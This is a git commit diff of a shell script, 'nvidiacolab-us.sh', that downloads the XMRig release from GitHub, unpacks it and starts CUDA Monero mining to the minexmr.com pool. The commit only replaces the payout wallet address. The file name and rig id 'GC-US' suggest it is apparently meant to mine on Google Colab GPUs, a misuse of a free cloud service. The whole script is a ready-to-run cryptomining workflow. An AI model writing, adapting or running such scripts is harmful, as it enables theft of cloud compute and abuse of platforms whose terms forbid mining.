f9986166c908d4e5db4b401e71d8186acc752d4e
golfohotel <107453859+golfohotel@users.noreply.github.com>
2022-06-14 00:36:59 -0400

    Update nvidiacolab-us.sh

--- nvidiacolab-us.sh
+++ nvidiacolab-us.sh
@@ -10,4 +10,4 @@ screen -R xmr
 wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz
 tar xvzf xmrig-6.17.0-linux-x64.tar.gz
 cd xmrig-6.17.0
-./xmrig --cuda -o us-west.minexmr.com:443 -u 8A6cdvshzV4dEWthU6fdgjMoJaNgwTn7rLDSdpLoKtHrQ83cdQCWtQQe6HGDrnYv5Z3zUfGuKSR8AByBGpgVPkc8Kp95en3 -k --tls --rig-id GC-US
+./xmrig --cuda -o us-west.minexmr.com:443 -u 84fEtd6AZ6eRe4jnjSHfAFKhPkaegfBTwKhGHquqZdoqgmBd3WDJNb7cMZYn1Sj5x62gmwoBJY1GRYJjEh8LkLHRKUzHrqE -k --tls --rig-id GC-US
